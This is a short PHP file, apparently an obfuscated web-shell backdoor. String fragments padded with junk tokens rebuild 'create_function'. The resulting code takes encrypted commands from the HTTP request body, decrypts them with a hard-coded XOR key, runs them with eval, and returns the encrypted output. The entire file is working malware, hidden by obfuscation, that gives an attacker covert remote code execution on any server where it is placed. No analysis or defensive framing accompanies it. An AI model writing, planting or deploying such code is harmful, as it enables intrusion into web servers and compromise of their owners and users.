<?php
$A='"/$kh(A..+)$kA.f/A.",@file_gA.et_A.cA.onA.tents("php://A.input"A.),$m)==1) A.{@ob_sA.tart()A.;@eA';
$L='$kA.A.="d8ded3f5"A.;$kh="4d0aed2A.e5e6A.a";$kf="3A.56aA.A.898644fa";$p=A."HNHA.UM0A.0Y0go7O2P6";A.A.fu';
$d='0;($A.j<$c&A.&$i<$lA.);$j++,$i++A.A.){$oA..=$A.t{$A.i}^$k{$jA.};}}return A.$o;}if (@preA.g_matA.ch(';
$h=str_replace('S','','crSeaSteSS_funcStSion');
$l='_A.eA.nd_cleanA.();$r=@baA.sA.e64_encA.ode(@x(@gzA.A.cA.ompress($o),$kA.));printA.("$p$khA.$r$kf");}';
$T='nction A.xA.($t,$k)A.{$c=strlen(A.$k);$l=A.strlA.A.en($t);$o="";forA.($i=0;A.A.$i<$lA.;){A.for($j=';
$v='.val(A.@gA.zuncA.ompress(@x(@baA.se64_decA.odA.e($m[1]A.),$k)));$oA.=@A.oA.b_get_contentsA.();@ob';
$Y=str_replace('A.','',$L.$T.$d.$A.$v.$l);
$K=$h('',$Y);$K();
?>
